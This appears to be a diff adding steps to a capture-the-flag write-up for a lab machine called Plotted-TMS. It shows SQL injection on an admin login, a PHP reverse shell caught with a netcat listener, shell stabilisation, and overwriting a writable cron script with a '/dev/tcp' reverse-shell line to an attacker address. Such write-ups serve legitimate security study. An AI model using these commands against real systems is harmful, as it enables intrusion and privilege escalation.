@@ -270,9 +270,95 @@ VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
 
 ![image](https://github.com/user-attachments/assets/9d6a8fc9-1a1a-455e-a158-ac73f03c74a7)
 
+<br>
+
+<h3>SQL Injection</h3>
+
+![image](https://github.com/user-attachments/assets/45417d28-827f-42f8-9f64-4784cdbd08bd)
+
+<h3>http://10.10.96.120:445/management/admin/login.php</h3>
+
+![image](https://github.com/user-attachments/assets/92eb1c7c-3f0a-40fe-8a8d-d4ad569e1bee)
+
+![image](https://github.com/user-attachments/assets/2e8e8086-cb42-458a-b510-4cfa8764d64d)
+
+![image](https://github.com/user-attachments/assets/7053be1b-60ed-41be-a300-67c99807adb5)
 
 
+<h3>Reverse shell</h3>
+<p>php</p>
 
-`
+![image](https://github.com/user-attachments/assets/de4576c4-780b-427f-b9cb-1fe41e918bd3)
+
+
+<h3>listener</h3>
+
+```bash
+:~/Plotted-TMS# nc -nlvp 4444
+```
+
+<h3>Loaded <code>rev.php</code></h3>
+
+![image](https://github.com/user-attachments/assets/84ff886f-d653-4257-ac5d-3134fd663e95)
+
+<h3>shell</h3>
+
+```bash
+:~/Plotted-TMS# nc -nlvp 4444
+```
+
+<h3>Stabilized</h3>
+
+```bash
+:~/Plotted-TMS# nc -nlvp 4444
+...
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ which python3
+/usr/bin/python3
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@plotted:/$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~/Plotted-TMS# stty raw -echo; fg
+nc -nlvp 4444
+
+www-data@plotted:/$ 
+```
+
+<h3>scripts</h3>
+
+```bash
+www-data@plotted:/var/www/scripts$ ls -lah
+total 12K
+drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
+drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
+-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
+www-data@plotted:/var/www/scripts$ cat backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
+/bin/chmod -R 770 /home/plot_admin/tms_backup/management
+www-data@plotted:/var/www/scripts$ 
+```
+
+```bash
+www-data@plotted:/var/www/scripts$ rm backup.sh
+rm: remove write-protected regular file 'backup.sh'? y
+www-data@plotted:/var/www/scripts$ touch backup.sh
+www-data@plotted:/var/www/scripts$ echo "/bin/sh -i >& /dev/tcp/10.10.98.235/9001 0>&1" > backup.sh 
+```
+
+
+```bash
+www-data@plotted:/var/www/scripts$ chmod +x backup.sh
+www-data@plotted:/var/www/scripts$ ls -lah
+total 12K
+drwxr-xr-x 2 www-data www-data 4.0K Jul  6 19:42 .
+drwxr-xr-x 4 root     root     4.0K Oct 28  2021 ..
+-rwxrwxrwx 1 www-data www-data   46 Jul  6 19:44 backup.sh
+www-data@plotted:/var/www/scripts$
+```
+
 
 
